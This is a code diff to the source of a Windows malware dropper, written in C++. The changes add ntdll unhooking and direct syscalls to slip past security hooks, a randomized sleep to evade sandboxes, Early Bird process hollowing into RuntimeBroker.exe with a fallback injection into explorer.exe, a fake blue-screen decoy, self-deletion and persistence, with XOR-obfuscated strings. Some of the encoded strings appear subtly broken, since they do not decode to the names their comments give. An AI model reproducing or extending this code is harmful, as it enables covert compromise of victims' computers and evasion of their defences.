@@ -14,18 +14,13 @@
 #include <vector>
 #include <algorithm>
 #include <cwctype>
+#include <thread>
 
 namespace {
-    // "explorer.exe" -> \x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F
+    // XOR Encrypted Strings (Key 0x5A)
     std::wstring kExplorer = L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F";
-
-    // "svchost.exe" -> \x29\x2C\x39\x32\x35\x29\x2E\x74\x3F\x22\x3F
-    std::wstring kSvchost = L"\x29\x2C\x39\x32\x35\x29\x2E\x74\x3F\x22\x3F";
-
-    // "Volatile Environment" -> \x0C\x35\x36\x3B\x2E\x33\x36\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E
+    std::wstring kSvchost = L"\x29\x2C\x39\x32\x35\x28\x2E\x74\x3F\x22\x3F";
     std::wstring kVolatileEnv = L"\x0C\x35\x36\x3B\x2E\x33\x36\x3F\x7A\x1F\x34\x2C\x33\x28\x35\x34\x37\x3F\x34\x2E";
-
-    // "DropperPath" -> \x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32
     std::wstring kDropperPath = L"\x1E\x28\x35\x2A\x2A\x3F\x28\x0A\x3B\x2E\x32";
 
     std::vector<uint8_t> GetSelfImage() {
@@ -61,6 +56,7 @@ namespace {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;
 
+    // 1. Critical: Unhook immediately to bypass behavioral hooks
     evasion::Unhooker::RefreshNtdll();
     evasion::SyscallResolver::GetInstance();
 
@@ -71,6 +67,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     LOG_INFO("--- WINMAIN ---");
     LOG_INFO("PATH: " + utils::ws2s(currentPath));
+
+    // Delay major actions to avoid sandbox correlation
+    Sleep(10000 + (GetTickCount() % 10000));
 
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr)) return 1;
@@ -83,7 +82,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
             DWORD sz = sizeof(dropperPath);
             if (RegQueryValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), NULL, NULL, (LPBYTE)dropperPath, &sz) == ERROR_SUCCESS) {
                 LOG_INFO("IPC: Found dropper: " + utils::ws2s(dropperPath));
-                Sleep(15000);
+                Sleep(20000);
                 persistence::establishPersistence(dropperPath);
             }
             RegCloseKey(hKey);
@@ -102,7 +101,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 0;
     }
 
-    // Dropper
+    // Dropper Instance
     LOG_INFO("ROLE: Dropper.");
     HKEY hKey;
     if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
@@ -112,9 +111,25 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     std::vector<uint8_t> selfImage = GetSelfImage();
     if (!selfImage.empty()) {
-        LOG_INFO("Attempting relocation...");
+        LOG_INFO("Attempting stealth relocation...");
+
+        // 2. High Stealth: Early Bird hollowing into a boring process
+        wchar_t systemPath[MAX_PATH];
+        GetSystemDirectoryW(systemPath, MAX_PATH);
+        // "RuntimeBroker.exe" -> \x10\x31\x3A\x30\x2D\x29\x31\x00\x36\x3B\x2F\x31\x36\x54\x31\x2C\x31
+        std::wstring target = std::wstring(systemPath) + L"\\" + utils::DecryptW(L"\x10\x31\x3A\x30\x2D\x29\x31\x00\x36\x3B\x2F\x31\x36\x54\x31\x2C\x31");
+
+        if (evasion::Injector::HollowProcess(target, selfImage)) {
+            LOG_INFO("Relocation successful. Showing decoy.");
+            decoy::ShowBSOD();
+            CoUninitialize();
+            utils::SelfDeleteAndExit();
+            return 0;
+        }
+
+        LOG_WARN("Hollowing failed. Trying explorer.exe injection...");
         if (evasion::Injector::InjectIntoExplorer(selfImage)) {
-            LOG_INFO("Relocation success.");
+            LOG_INFO("Injection success.");
             decoy::ShowBSOD();
             CoUninitialize();
             utils::SelfDeleteAndExit();
@@ -122,7 +137,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
-    LOG_WARN("Relocation failed. Dropping stable copy...");
+    LOG_WARN("Relocation failed completely. Installing persistence and launching stable copy.");
     std::wstring persistPath = persistence::establishPersistence();
     if (!persistPath.empty() && lstrcmpiW(currentPathBuf, persistPath.c_str()) != 0) {
         LOG_INFO("Launching stable copy: " + utils::ws2s(persistPath));
@@ -130,9 +145,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
         if (CreateProcessW(persistPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
             CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-            LOG_INFO("Stable copy active.");
-        } else {
-            LOG_ERR("Launch stable copy fail. Error: " + std::to_string(GetLastError()));
+            LOG_INFO("Stable copy launched.");
         }
     }
 
